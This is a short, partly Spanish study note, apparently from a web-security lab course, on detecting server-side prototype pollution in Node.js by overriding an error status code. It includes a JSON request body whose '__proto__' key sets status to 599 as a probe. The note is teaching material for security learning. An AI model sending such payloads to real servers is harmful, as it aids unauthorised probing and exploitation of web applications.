---
title: "7 - Detecting server-side prototype pollution without polluted property reflection"
---

# 7 - Detecting server-side prototype pollution without polluted property reflection

1. **Con status code override** :

```JSON
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Node's http-errors module contains the following function for generating this kind of error response:

```javascript
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"TLagtKgaY7uiNNjiFaSBzulYMiWzsAqu",
	"__proto__": {
		"status":599
	}
}
```

Cuando mandemos un error, si no se ha definido un código de estado propio para ese error, se enviará el que hemos contaminado, el de object.
